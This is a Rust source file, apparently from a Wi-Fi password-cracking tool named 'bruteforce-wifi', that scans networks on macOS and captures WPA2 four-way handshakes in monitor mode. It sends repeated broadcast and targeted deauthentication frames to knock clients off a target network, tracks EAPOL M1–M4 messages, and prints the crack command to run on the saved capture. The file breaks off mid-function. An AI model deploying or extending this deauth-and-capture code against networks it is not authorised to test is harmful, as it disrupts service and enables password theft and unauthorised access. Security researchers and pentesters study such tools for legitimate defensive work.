#![allow(clippy::print_literal)]

use crate::core::handshake::extract_eapol_from_packet;
use anyhow::{anyhow, Context, Result};
use pcap::Capture;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::process::Command;
use std::str;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

fn get_all_wifi_channels() -> Vec<u32> {
    let mut channels = Vec::new();

    // =========================
    // 2.4 GHz (IEEE 802.11)
    // =========================
    // Channels 1–13 (14 is restricted in most world)
    for ch in 1..=13 {
        channels.push(ch);
    }

    // =========================
    // 5 GHz (IEEE 802.11a/n/ac/ax)
    // =========================
    // Valid 5 GHz channels are multiples of 4 from 36 to 165
    // as defined by IEEE (UNII-1, UNII-2, UNII-2e, UNII-3)
    let mut ch = 36;
    while ch <= 165 {
        channels.push(ch);
        ch += 4;
    }

    // =========================
    // 6 GHz (Wi-Fi 6E / Wi-Fi 7)
    // =========================
    // Channels 1–233 (5925–7125 MHz)
    for ch in 1..=233 {
        channels.push(ch);
    }

    channels
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct WifiNetwork {
    pub ssid: String,
    pub bssid: String,
    pub channel: String,
    pub signal_strength: String,
    pub security: String,
}

impl std::fmt::Display for WifiNetwork {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // Show channels if multiple BSSIDs exist for same SSID
        if self.channel.contains(',') {
            write!(f, "{} (Channels: {})", self.ssid, self.channel)
        } else {
            write!(f, "{} (Ch {})", self.ssid, self.channel)
        }
    }
}

/// Compact duplicate networks (same SSID, different BSSIDs/channels)
/// This is common with:
/// - Mesh networks
/// - Routers with multiple radios (2.4GHz + 5GHz)
/// - Smart Connect / Band Steering
pub fn compact_duplicate_networks(networks: Vec<WifiNetwork>) -> Vec<WifiNetwork> {
    use std::collections::HashMap;

    let mut ssid_map: HashMap<String, Vec<WifiNetwork>> = HashMap::new();

    // Group networks by SSID
    for network in networks {
        ssid_map
            .entry(network.ssid.clone())
            .or_default()
            .push(network);
    }

    let mut compacted = Vec::new();

    for (_ssid, mut networks) in ssid_map {
        if networks.len() == 1 {
            // Single network, no duplication
            compacted.push(networks.pop().unwrap());
        } else {
            // Multiple networks with same SSID - compact them
            // Sort by signal strength (strongest first)
            networks.sort_by(|a, b| {
                let a_rssi = a.signal_strength.parse::<i32>().unwrap_or(-100);
                let b_rssi = b.signal_strength.parse::<i32>().unwrap_or(-100);
                b_rssi.cmp(&a_rssi) // Higher (less negative) is better
            });

            // Use the strongest signal's BSSID as primary
            let primary = networks[0].clone();

            // Collect all channels and BSSIDs
            let mut channels = Vec::new();
            let mut bssids = Vec::new();

            for net in &networks {
                if !channels.contains(&net.channel) {
                    channels.push(net.channel.clone());
                }
                if !bssids.contains(&net.bssid) {
                    bssids.push(net.bssid.clone());
                }
            }

            // Create compacted entry
            compacted.push(WifiNetwork {
                ssid: primary.ssid,
                bssid: if bssids.len() > 1 {
                    format!("{} (+{} more)", primary.bssid, bssids.len() - 1)
                } else {
                    primary.bssid
                },
                channel: channels.join(","),
                signal_strength: primary.signal_strength,
                security: primary.security,
            });
        }
    }

    // Sort by SSID for consistent display
    compacted.sort_by(|a, b| a.ssid.cmp(&b.ssid));

    compacted
}

pub fn scan_networks(interface: &str) -> Result<Vec<WifiNetwork>> {
    println!("{} Scanning for networks...", "[*]");

    // Note: We DON'T disconnect WiFi for a simple scan
    // (disconnection is only needed for packet capture to improve reliability)

    // MAC OS implementation
    // try to use native airport first, then fallback to swift script if airport is missing
    // Actually, we found airport is missing on this system.
    // We will implement a Swift-based scanner which uses CoreWLAN (same as system menu).

    // First, try our Embedded Swift Scanner (most reliable on modern macOS)
    if let Ok(networks) = scan_networks_swift() {
        if !networks.is_empty() {
            // Check if we got BSSIDs or if they're all empty (privacy restriction)
            let has_bssids = networks.iter().any(|n| !n.bssid.is_empty());

            if has_bssids {
                // Compact duplicate networks (same SSID, multiple BSSIDs/channels)
                let compacted = compact_duplicate_networks(networks);
                return Ok(compacted);
            }

            // BSSIDs are missing due to macOS privacy restrictions
            // On modern macOS (especially Apple Silicon), monitor mode is disabled at firmware level
            // The ONLY working solution is Location Services
            println!();
            println!(
                "{}",
                "❌ BSSID Information Blocked by macOS Privacy Settings"
            );
            println!();
            println!(
                "{}",
                "macOS 10.15+ requires Location Services permission to access WiFi BSSIDs."
            );
            println!("{}", "Without BSSIDs, you CANNOT capture handshakes!");
            println!();
            println!("{}", "💡 Why this happens:");
            println!(
                "{}",
                "  • Apple considers WiFi BSSIDs as location data (can track your position)"
            );
            println!(
                "{}",
                "  • Monitor mode is disabled on Apple Silicon (M1/M2/M3)"
            );
            println!("{}", "  • sudo doesn't bypass privacy restrictions");
            println!();
            println!("{}", "🔧 FIX (takes 30 seconds):");
            println!();
            println!(
                "{}",
                "  1. Open  → System Settings → Privacy & Security → Location Services"
            );
            println!("{}", "  2. Find the app in the list and CHECK the box");
            println!("{}", "  3. Quit the app completely (Cmd+Q) and reopen it");
            println!("{}", "  4. Run this scan again (without sudo)");
            println!();
            println!(
                "📖 Full guide: {}/MACOS_SETUP.md",
                env!("CARGO_MANIFEST_DIR")
            );
            println!();
            println!("{}", "⚠️  Returning partial scan results (no BSSIDs)...");
            println!();

            return Ok(networks);
        }
    }

    // Fallback: Try legacy airport binary (just in case)
    if let Some(airport_binary) = find_airport_path() {
        if let Ok(output) = Command::new(&airport_binary).args(["-s"]).output() {
            if output.status.success() {
                let stdout =
                    str::from_utf8(&output.stdout).context("Failed to parse command output")?;
                return parse_airport_output(stdout); // Renamed from parse_scan_output
            }
        }
    }

    // Final Fallback: Use pcap scan
    println!(
        "{} Native tools failed. Falling back to pcap scan...",
        "[!]"
    );
    println!("{} This may be slower and limited.", "[*]");
    scan_pcap(interface)
}

fn parse_airport_output(output: &str) -> Result<Vec<WifiNetwork>> {
    let mut networks = Vec::new();

    // Header: SSID BSSID RSSI CHANNEL HT CC SECURITY ...
    let bssid_re = Regex::new(r"([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})").unwrap();

    let lines: Vec<&str> = output.lines().collect();

    for line in lines {
        let line = line.trim();
        if line.starts_with("SSID") || line.is_empty() {
            continue;
        }

        if let Some(mat) = bssid_re.find(line) {
            let bssid = mat.as_str().to_string();
            let ssid = line[0..mat.start()].trim().to_string(); // SSID is left of BSSID

            let remainder = &line[mat.end()..]; // Right of BSSID
                                                // Format: RSSI CHANNEL HT CC SECURITY ...
                                                // e.g. " -80  11      Y  US WPA2(PSK/AES/AES) "

            let parts: Vec<&str> = remainder.split_whitespace().collect();
            if parts.len() >= 2 {
                let rssi = parts[0];
                let channel = parts[1];

                // Security is the rest
                let security = if parts.len() >= 5 {
                    // parts[0]=rssi, [1]=ch, [2]=HT, [3]=CC, [4..]=Security
                    parts[4..].join(" ")
                } else {
                    // Sometimes HT/CC are missing?
                    if parts.len() > 2 {
                        parts[2..].join(" ")
                    } else {
                        "Unknown".to_string()
                    }
                };

                networks.push(WifiNetwork {
                    ssid: if ssid.is_empty() {
                        "<Hidden>".to_string()
                    } else {
                        ssid
                    },
                    bssid,
                    channel: channel.to_string(),
                    signal_strength: rssi.to_string(),
                    security,
                });
            }
        }
    }
    Ok(networks)
}

/// Check if WiFi interface is currently connected to a network
/// Returns Some(ssid) if connected, None otherwise
fn check_wifi_connected() -> Option<String> {
    use std::process::Command;

    let airport_path =
        "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport";

    let output = Command::new(airport_path).arg("-I").output().ok()?;

    if !output.status.success() {
        return None;
    }

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Look for " SSID: " line
    for line in stdout.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("SSID:") {
            let ssid = trimmed.strip_prefix("SSID:")?.trim();
            if !ssid.is_empty() {
                return Some(ssid.to_string());
            }
        }
    }

    None
}

/// Disconnect from WiFi on macOS
pub fn disconnect_wifi() -> Result<()> {
    use std::io::Write;

    println!("{}", "🔌 Disconnecting from WiFi...");

    // Use Swift to disconnect using CoreWLAN
    let script_content = r#"
import CoreWLAN

let client = CWWiFiClient.shared()
if let interface = client.interface() {
    interface.disassociate()
    print("Disconnected")
} else {
    print("No interface")
    exit(1)
}
"#;

    let script_path = "/tmp/wifi_disconnect.swift";
    let mut file = std::fs::File::create(script_path)?;
    file.write_all(script_content.as_bytes())?;

    let output = Command::new("swift").arg(script_path).output()?;

    if output.status.success() {
        println!("{}", "✓ WiFi disconnected");
        Ok(())
    } else {
        Err(anyhow!("Failed to disconnect WiFi"))
    }
}

/// Parameters for traffic capture
pub struct CaptureOptions<'a> {
    pub interface: &'a str,
    pub channel: Option<u32>,
    pub ssid: Option<&'a str>,
    pub bssid: Option<&'a str>,
    pub output_file: &'a str,
    pub duration: Option<u64>,
    pub no_deauth: bool,
}

/// Capture traffic to a file
///
/// If `ssid` or `bssid` is provided, it attempts to:
/// 1. Find the BSSID (AP MAC) from Beacon/ProbeResponse frames
/// 2. Send deauthentication frames to connected clients to force a handshake (if not disabled)
pub fn capture_traffic(options: CaptureOptions) -> Result<()> {
    let interface = options.interface;
    let channel = options.channel;
    let ssid = options.ssid;
    let bssid = options.bssid;
    let output_file = options.output_file;
    let duration = options.duration;
    let no_deauth = options.no_deauth;
    println!("{}", "📡 Starting packet capture...");
    println!("Interface: {}", interface);
    println!("Output: {}", output_file);
    if let Some(target) = ssid {
        println!("Target SSID: {}", target);
    }
    if let Some(target_bssid) = bssid {
        println!("Target BSSID: {}", target_bssid);
    }

    // Parse BSSID if provided
    let parsed_bssid = if let Some(b) = bssid {
        Some(parse_mac(b)?)
    } else {
        None
    };

    // macOS packet injection warning
    if !no_deauth {
        println!();
        println!("{}", "⚠️  macOS LIMITATION:");
        println!("{}", "   Apple Silicon does NOT support packet injection.");
        println!("{}", "   Deauth attacks will NOT work on this Mac.");
        println!("{}", "   ");
        println!(
            "{}",
            "   💡 To capture a handshake, you must MANUALLY reconnect a device:"
        );
        println!("{}", "      1. On your phone/laptop, turn WiFi OFF then ON");
        println!("{}", "      2. Or 'Forget' and reconnect to the network");
        println!();
    } else {
        println!("{}", "ℹ️  Passive capture mode (--no-deauth)");
    }

    // ========================================================================
    // Check if WiFi is connected - auto-disconnect for better capture
    // ========================================================================
    if let Some(connected_ssid) = check_wifi_connected() {
        println!();
        println!("📡 Connected to: '{}'", connected_ssid);
        println!("   Auto-disconnecting for better capture...");

        // Auto-disconnect
        if let Ok(()) = disconnect_wifi() {
            std::thread::sleep(Duration::from_secs(1));
            println!("{}", "   ✓ Disconnected successfully");
        } else {
            println!("{}", "   ⚠️  Could not auto-disconnect");
            println!(
                "{}",
                "   💡 Manually disconnect: Option+Click WiFi icon → Disconnect"
            );
            std::thread::sleep(Duration::from_secs(2));
        }
        println!();
    }

    // ========================================================================
    // CRITICAL: Perform SSID/channel scanning BEFORE opening monitor mode!
    // The airport -s scan does not work when the interface is in monitor mode.
    // ========================================================================

    let mut channels_to_scan = Vec::new();

    if let Some(target_ssid) = ssid {
        if channel.is_none() {
            println!("🔍 Scanning for all channels (Smart Connect support)...");
            println!("   (Scanning BEFORE enabling monitor mode)");

            // Perform scan while interface is still in managed mode
            let networks = detect_all_channels_for_ssid(target_ssid);

            if networks.is_empty() {
                println!(
                    "⚠️  Could not detect '{}'. Will scan ALL channels.",
                    target_ssid
                );
                println!("   💡 Tip: Make sure the network is broadcasting and you're in range.");
                // Fallback: scan ALL possible channels
                channels_to_scan = get_all_wifi_channels();
            } else {
                println!(
                    "✓ Found '{}' on {} channel(s):",
                    target_ssid,
                    networks.len()
                );
                for net in &networks {
                    let band_str = match net.band {
                        WifiBand::Band24GHz => "2.4GHz",
                        WifiBand::Band5GHz => "5GHz",
                    };
                    println!(
                        "  • Ch {} ({}) | BSSID: {} | RSSI: {} dBm",
                        net.channel, band_str, net.bssid, net.rssi
                    );
                    channels_to_scan.push(net.channel);
                }
                let rotation_msg = if channels_to_scan.len() > 10 {
                    format!("🔄 Will rotate through {} channel(s) every 5 seconds (Smart Connect + DFS support)", channels_to_scan.len())
                } else {
                    format!(
                        "🔄 Will rotate through {} channel(s) every 10 seconds",
                        channels_to_scan.len()
                    )
                };
                println!("{}", rotation_msg);
            }
        }
    } else if let Some(target_bssid_str) = bssid {
        if channel.is_none() {
            // No SSID, but BSSID provided
            println!("🔍 Scanning for BSSID {}...", target_bssid_str);

            let networks = detect_channels_for_bssid(target_bssid_str);

            if networks.is_empty() {
                println!(
                    "⚠️  Could not detect BSSID '{}'. Will scan ALL channels.",
                    target_bssid_str
                );
                channels_to_scan = get_all_wifi_channels();
            } else {
                println!(
                    "✓ Found BSSID {} on {} channel(s):",
                    target_bssid_str,
                    networks.len()
                );
                for net in &networks {
                    println!("  • Ch {} | RSSI: {} dBm", net.channel, net.rssi);
                    channels_to_scan.push(net.channel);
                }
            }
        }
    } else if channel.is_none() {
        // No SSID specified - scan all channels
        println!("ℹ️  No target SSID/BSSID specified. Scanning ALL channels.");
        channels_to_scan = get_all_wifi_channels();
    } else {
        // Manual channel specified
        if let Some(ch) = channel {
            channels_to_scan.push(ch);
            println!("ℹ️  Monitoring on Channel {} (manual)", ch);
        }
    }

    if channels_to_scan.is_empty() {
        println!("⚠️  No channels to scan. Please specify --channel manually.");
        return Err(anyhow!("No channels detected"));
    }

    // ========================================================================
    // NOW open capture in monitor mode (after scanning is complete)
    // ========================================================================

    println!("{}", "📡 Opening interface in monitor mode...");

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    })
    .ok();

    // Open capture in monitor mode
    let mut cap_builder = Capture::from_device(interface)
        .context("Failed to find device")?
        .promisc(true);

    #[cfg(not(target_os = "windows"))]
    {
        cap_builder = cap_builder.rfmon(true); // Critical for monitor mode
    }

    let mut cap = cap_builder
        .timeout(100) // 100ms timeout for read
        .open()
        .map_err(|e| anyhow!("Failed to open capture device: {}", e))?;

    println!("{}", "✓ Monitor mode enabled");

    let mut savefile = cap
        .savefile(output_file)
        .context("Failed to create output file")?;

    println!("{}", "🟢 Capturing... (Press Ctrl+C to stop)");

    let start = std::time::Instant::now();
    let mut packets_count = 0;

    // Channel rotation state
    let mut current_channel_idx = 0;
    let mut last_channel_switch = std::time::Instant::now();
    // Adaptive dwell time: if scanning many channels, rotate faster
    let channel_dwell_time = if channels_to_scan.len() > 10 {
        Duration::from_secs(5) // 5 seconds per channel for many channels
    } else {
        Duration::from_secs(10) // 10 seconds per channel for few channels
    };
    let mut handshake_found = false; // Stop rotation when handshake is complete

    // Set initial channel
    if !channels_to_scan.is_empty() {
        let initial_ch = channels_to_scan[0];
        set_channel_macos(interface, initial_ch);
        println!("📡 Starting on Channel {}", initial_ch);
    }

    // State for deauth attack
    let mut target_bssid: Option<[u8; 6]> = parsed_bssid;
    let mut last_deauth = std::time::Instant::now();
    // Helper to find BSSID from SSID if needed
    let target_ssid_bytes = ssid.map(|s| s.as_bytes());

    // State for handshake detection
    let mut pending_handshakes: HashMap<[u8; 6], [u8; 32]> = HashMap::new(); // Client Mac -> Anonce (from M1)
    let mut bssid_to_ssid: HashMap<[u8; 6], String> = HashMap::new(); // BSSID -> SSID mapping
    let _last_valid_packet = std::time::Instant::now(); // To detect if we are "stuck" on a quiet channel
    let mut consecutive_partial_handshakes = 0; // To detect if we are on a side channel (hearing M2/M4 but not M1)

    while running.load(Ordering::SeqCst) {
        if let Some(d) = duration {
            if start.elapsed().as_secs() >= d {
                break;
            }
        }

        // 1. Capture packet
        match cap.next_packet() {
            Ok(packet) => {
                // Save to file
                savefile.write(&packet);
                packets_count += 1;

                // Handshake Detection
                if let Some(eapol) = extract_eapol_from_packet(packet.data) {
                    // "Smart Dwell": If we detect EAPOL (even from unknown BSSID if we have a target), we should extend scan time
                    // But if we have a target_bssid, we prioritize matching that.

                    // "Promiscuous Handshake": Capture ALL handshakes.
                    // If the user specified a target BSSID, but we see a handshake for another BSSID,
                    // it is VERY likely the same router on another band (or user error).
                    let is_target = if let Some(target) = target_bssid {
                        if eapol.ap_mac == target {
                            true
                        } else {
                            // "Fuzzy Match" - Check if first 3 bytes (OUI) match, or just log it
                            false
                        }
                    } else {
                        // No specific BSSID target, so everything is potentially a target
                        true
                    };

                    // ALWAYS process EAPOL, but color code based on if it matches target
                    let _is_interesting = true; // We want everything now

                    if _is_interesting {
                        // Smart Dwell Anti-Stuck:
                        // If we see too many M2/M4 without M1, force rotation
                        if consecutive_partial_handshakes > 5 {
                            println!("⚠️  Too many partial handshakes without M1. Force rotating channel...");
                            consecutive_partial_handshakes = 0;
                            last_channel_switch = std::time::Instant::now() - channel_dwell_time;
                        // Force switch
                        } else {
                            // Smart Dwell: Reset channel switch timer to stay on this active channel
                            if last_channel_switch.elapsed().as_secs() > 2 {
                                last_channel_switch = std::time::Instant::now();
                                println!(
                                    "⏳ Activity detected on Channel {} - Extending scan...",
                                    channels_to_scan[current_channel_idx]
                                );
                            }
                        }

                        match eapol.message_type {
                            1 => {
                                // M1: Store Anonce
                                consecutive_partial_handshakes = 0; // Valid M1 seen! We are likely on good channel.
                                if let Some(anonce) = eapol.anonce {
                                    pending_handshakes.insert(eapol.client_mac, anonce);
                                    println!("\n🔑 M1 (ANonce) - AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                        eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                        eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                        eapol.replay_counter
                                    );
                                }
                            }
                            2 => {
                                // M2: Check if we have M1
                                println!("\n🔐 M2 (SNonce+MIC) - Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                    eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                    eapol.replay_counter
                                );

                                if let Some(_stored_anonce) =
                                    pending_handshakes.get(&eapol.client_mac)
                                {
                                    // ... check for handshake completion ...
                                    let captured_ssid = bssid_to_ssid.get(&eapol.ap_mac);
                                    let is_target_network = if let Some(target_ssid_str) = ssid {
                                        captured_ssid
                                            .map(|s| s.as_str() == target_ssid_str)
                                            .unwrap_or(false)
                                    } else {
                                        true
                                    };

                                    if is_target_network {
                                        println!("\n🎉 COMPLETE HANDSHAKE (M1+M2) for Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                                            eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5]
                                        );

                                        if let Some(network_ssid) = captured_ssid {
                                            println!("✅ Target SSID: '{}'", network_ssid);
                                        }

                                        if !handshake_found {
                                            handshake_found = true;
                                            // ... stop capture ...
                                            let current_ch = channels_to_scan[current_channel_idx];
                                            println!(
                                                "🔒 Locked on Channel {} - Handshake complete!",
                                                current_ch
                                            );

                                            // Warn if BSSID mismatch
                                            if !is_target {
                                                // ...
                                                if let Some(t_bssid) = target_bssid {
                                                    println!("⚠️  NOTE: Captured BSSID {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} does not match Target {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                                                        eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                                        t_bssid[0], t_bssid[1], t_bssid[2], t_bssid[3], t_bssid[4], t_bssid[5]
                                                     );
                                                }
                                            }

                                            println!("⏳ Waiting 2 more seconds to capture any remaining packets...");
                                            std::thread::sleep(Duration::from_secs(2));
                                            println!("🎯 Stopping capture automatically...");
                                            running.store(false, Ordering::SeqCst);
                                        }
                                    } else {
                                        let wrong_ssid =
                                            captured_ssid.map(|s| s.as_str()).unwrap_or("Unknown");
                                        println!("\n⚠️  COMPLETE HANDSHAKE found but for wrong network: '{}'", wrong_ssid);
                                        println!(
                                            "   Waiting for target SSID: '{}'",
                                            ssid.unwrap_or("N/A")
                                        );
                                    }
                                } else {
                                    println!(
                                        "   ⚠️  M2 without matching M1 (might be out of order)"
                                    );

                                    // NEW: If we see M2/M4 but missed M1, we can sometimes still crack it (if we have PMKID in M1 or just try PMK computation against MIC)
                                    // BUT WPA2 requires M1 Anonce.
                                    // However, for the sake of "saving" the capture, we should perhaps count this as a "Partial Capture" success if the user wants.
                                    // For now, let's just log it clearly.
                                    // Actually, if we miss M1, we are doomed for WPA2 cracking. M1 has Anonce.
                                    // M2 has Snonce + MIC.
                                    // MIC verification needs PTK. PTK needs Anonce + Snonce.
                                    // So M1 is MANDATORY.
                                    // Unless we can guess Anonce? No, it's random.
                                    // SO: We MUST have M1.
                                }
                            }
                            3 => {
                                println!("\n🔄 M3 - AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                    eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                    eapol.replay_counter
                                );
                            }
                            4 => {
                                println!("\n✅ M4 - Client {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} → AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} [RC:{}]",
                                    eapol.client_mac[0], eapol.client_mac[1], eapol.client_mac[2], eapol.client_mac[3], eapol.client_mac[4], eapol.client_mac[5],
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5],
                                    eapol.replay_counter
                                );
                            }
                            _ => {
                                println!("\n❓ Unknown EAPOL type {} from {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                                    eapol.message_type,
                                    eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5]
                                );
                            }
                        }
                    } else {
                        // EAPOL from different AP
                        println!("\n📦 EAPOL M{} from different AP {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} (ignored)",
                            eapol.message_type,
                            eapol.ap_mac[0], eapol.ap_mac[1], eapol.ap_mac[2], eapol.ap_mac[3], eapol.ap_mac[4], eapol.ap_mac[5]
                        );
                    }
                }

                if packets_count % 50 == 0 {
                    let elapsed = start.elapsed().as_secs();
                    let rate = if elapsed > 0 {
                        packets_count / elapsed
                    } else {
                        0
                    };
                    print!(
                        "\r📦 Packets: {} | Rate: {}/s | M1s: {} | Elapsed: {}s   ",
                        packets_count,
                        rate,
                        pending_handshakes.len(),
                        elapsed
                    );
                    use std::io::Write;
                    std::io::stdout().flush().unwrap();
                }

                // Discovery Logic: Scan all beacons to map BSSID -> SSID
                if let Some((bssid, network_ssid)) = parse_bssid_and_ssid_from_packet(packet.data) {
                    // Check if this is a NEW network we haven't seen before
                    let is_new_network = !bssid_to_ssid.contains_key(&bssid);

                    // Store BSSID -> SSID mapping
                    bssid_to_ssid.entry(bssid).or_insert(network_ssid.clone());

                    // Check if this is our target SSID
                    let is_target = if let Some(target_ssid) = target_ssid_bytes {
                        network_ssid.as_bytes() == target_ssid
                    } else {
                        false
                    };

                    // Display ALL networks detected (not just target)
                    if is_new_network {
                        let current_ch = channels_to_scan[current_channel_idx];

                        if is_target {
                            // Target network - show in GREEN and BOLD
                            println!("\n🎯 Found Target SSID '{}' with BSSID: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} on Channel {}",
                                network_ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], current_ch);

                            target_bssid = Some(bssid);
                            println!("🚀 Starting deauthentication attacks...");
                            println!("🔄 Continuing channel rotation for Smart Connect support");
                        } else {
                            // Other network - show dimmed for context
                            println!("\n📡 Detected SSID '{}' - {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} on Channel {}",
                                network_ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], current_ch);
                        }
                    }
                }
            }
            Err(pcap::Error::TimeoutExpired) => {
                // Timeout is fine, lets us check deauth timer
            }
            Err(e) => {
                // Some errors might be recoverable
                eprintln!("\nRead warning: {}", e);
            }
        }

        // 2. Channel Rotation Logic (for Smart Connect multi-band)
        // ONLY rotate if handshake not found yet
        if !handshake_found
            && channels_to_scan.len() > 1
            && last_channel_switch.elapsed() >= channel_dwell_time
        {
            current_channel_idx = (current_channel_idx + 1) % channels_to_scan.len();
            let new_channel = channels_to_scan[current_channel_idx];

            println!(
                "\n🔄 Switching to Channel {} ({}/{})",
                new_channel,
                current_channel_idx + 1,
                channels_to_scan.len()
            );

            set_channel_macos(interface, new_channel);
            last_channel_switch = std::time::Instant::now();
        }

        // 3. Deauth Attack Logic (Skip if no_deauth is true or on macOS which doesn't support injection)
        // Send deauth burst every 0.5 seconds if we have a target
        if !no_deauth {
            if let Some(bssid) = target_bssid {
                if last_deauth.elapsed() >= Duration::from_millis(500) {
                    // Send deauth frames (Burst) - Note: Will silently fail on macOS
                    for _ in 0..3 {
                        // 1. Broadcast Deauth
                        let _ =
                            send_deauth(&mut cap, &bssid, &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);

                        // 2. Targeted Deauth for known clients
                        for client in pending_handshakes.keys() {
                            let _ = send_deauth(&mut cap, &bssid, client);
                        }
                    }
                    last_deauth = std::time::Instant::now();
                }
            }
        }
    }

    println!("\n{}", "🛑 Capture stopped.");
    println!("Total packets: {}", packets_count);

    // CRITICAL: Drop savefile to flush all packets to disk before verification
    drop(savefile);

    // Verify captured handshake is exploitable
    if let Some(target_ssid) = ssid {
        println!("\n{}", "🔍 Verifying captured handshake...");

        use crate::core::handshake::parse_cap_file;
        match parse_cap_file(std::path::Path::new(output_file), None) {
            Ok(handshake) => {
                // Verify the captured SSID matches the target
                if handshake.ssid != target_ssid {
                    println!("❌ Wrong SSID captured: '{}'", handshake.ssid);
                    println!("   Expected: '{}'", target_ssid);

                    // Delete the file
                    if let Err(e) = std::fs::remove_file(output_file) {
                        println!("⚠️  Failed to delete file: {}", e);
                    } else {
                        println!("🗑️  Deleted '{}' (wrong SSID)", output_file);
                    }

                    println!("\n💡 To crack the captured network instead, run:");
                    println!("  bruteforce-wifi capture --interface en0 --ssid \"{}\" --output capture.cap", handshake.ssid);

                    return Err(anyhow!(
                        "Wrong SSID captured: expected '{}', got '{}'",
                        target_ssid,
                        handshake.ssid
                    ));
                }

                println!("✅ Handshake verified and ready to crack!");
                println!("\nHandshake Details:");
                println!("  SSID: {}", handshake.ssid);
                println!(
                    "  AP MAC: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                    handshake.ap_mac[0],
                    handshake.ap_mac[1],
                    handshake.ap_mac[2],
                    handshake.ap_mac[3],
                    handshake.ap_mac[4],
                    handshake.ap_mac[5]
                );
                println!("  Key Version: {}", handshake.key_version);

                println!("\nNext step - Run crack command:");
                println!(
                    "  bruteforce-wifi crack numeric {} --min 8 --max 8",
                    output_file
                );
            }
            Err(e) => {
                println!("⚠️  Handshake verification failed: {}", e);
                println!(
                    "   Expected SSID '{}' not found in capture file",
                    target_ssid
                );
                println!("\nPossible issues:");
                println!("  - Captured packets may be incomplete (missing M1 or M2)");
                println!("  - Wrong SSID specified (check the network name)");
                println!("  - Capture was too short to get a complete handshake");
                println!("\nTry running capture again for longer duration.");
            }
        }
    }

    Ok(())
}

/// Parse BSSID and SSID from beacon/probe response frames
fn parse_bssid_and_ssid_from_packet(data: &[u8]) -> Option<([u8; 6], String)> {
    // Basic check for radiotap header
    if data.len() < 50 {
        return None;
    }

    // Skip Radiotap (variable length)
    let radiotap_len = u16::from_le_bytes([data[2], data[3]]) as usize;
    if data.len() < radiotap_len + 24 {
        return None;
    }

    let frame = &data[radiotap_len..];

    // Frame Control: Type 0 = Management
    // Subtype 8 = Beacon, 5 = Probe Response
    let fc = frame[0];
    let f_type = (fc >> 2) & 0x3;
    let f_subtype = (fc >> 4) & 0xF;

    if f_type != 0 {
        return None;
    } // Not management
    if f_subtype != 8 && f_subtype != 5 {
        return None;
    } // Not Beacon/ProbeResp

    // Extract BSSID (Addr3 in management frames)
    let bssid: [u8; 6] = frame[16..22].try_into().ok()?;

    // Body starts at 24
    let body = &frame[24..];

    // Fixed Parameters: Timestamp (8) + Beacon Interval (2) + Cap Info (2) = 12 bytes
    if body.len() < 12 {
        return None;
    }

    let tags = &body[12..];
    let mut i = 0;
    while i < tags.len() {
        if i + 2 > tags.len() {
            break;
        }
        let id = tags[i];
        let len = tags[i + 1] as usize;
        let val_start = i + 2;
        let val_end = val_start + len;

        if val_end > tags.len() {
            break;
        }

        if id == 0 {
            // SSID Tag
            let ssid_bytes = &tags[val_start..val_end];
            if let Ok(ssid_str) = String::from_utf8(ssid_bytes.to_vec()) {
                return Some((bssid, ssid_str));
            }
            return None;
        }
